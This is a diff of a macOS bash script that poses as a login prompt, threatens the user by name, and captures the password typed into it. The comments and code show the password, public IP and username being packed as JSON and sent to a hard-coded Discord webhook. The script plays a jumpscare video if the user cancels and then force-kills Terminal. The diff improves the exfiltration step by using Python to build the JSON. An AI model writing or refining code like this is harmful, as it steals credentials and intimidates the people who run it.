@@ -1,17 +1,17 @@
 #!/bin/bash
-# Combined Login Prompt with Jumpscare Fallback for macOS (No Python Needed)
+# Combined Login Prompt with Jumpscare Fallback for macOS
 # ----------------------------------------------------------------
 # - Displays a login prompt:
 #     "I know where you live, [FirstName]."
 #     "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
 # - If a non-empty password is entered, it sends the password, public IP,
-#   and username to a Discord webhook by generating a JSON payload using sed.
+#   and username to a Discord webhook using Python for JSON generation.
 # - If the user cancels (or leaves the password empty), it downloads and plays
 #   a jumpscare video (from GitHub) in the browser (full-screen, at max volume).
 # - Finally, it force-kills Terminal.
 #
 # Requirements:
-#   - macOS with osascript, curl, and standard Unix utilities.
+#   - macOS with osascript, curl, and either python3 or python2 installed.
 #
 # Usage:
 #   chmod +x combined_script.sh
@@ -117,12 +117,19 @@ else
     
     # --- Save Data to Temporary File ---
     echo -e "$capture" > /tmp/pass.txt
+
+    # --- Determine Python Interpreter (Prefer python3, fallback to python2) ---
+    if command -v python3 &>/dev/null; then
+        PYTHON=python3
+    elif command -v python2 &>/dev/null; then
+        PYTHON=python2
+    else
+        echo "Neither Python3 nor Python2 is available. Exiting."
+        exit 1
+    fi
     
-    # --- Generate JSON Payload Without Python ---
-    # This sed command reads the entire file, replaces actual newlines with literal "\n",
-    # and escapes any double quotes.
-    json_content=$(sed ':a;N;$!ba;s/\n/\\n/g' /tmp/pass.txt | sed 's/"/\\"/g')
-    payload=$(printf '{"content": "%s"}' "$json_content")
+    # --- Generate JSON Payload using the selected Python interpreter ---
+    payload=$($PYTHON -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < /tmp/pass.txt)
     
     # --- Send Payload to Discord Webhook ---
     DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
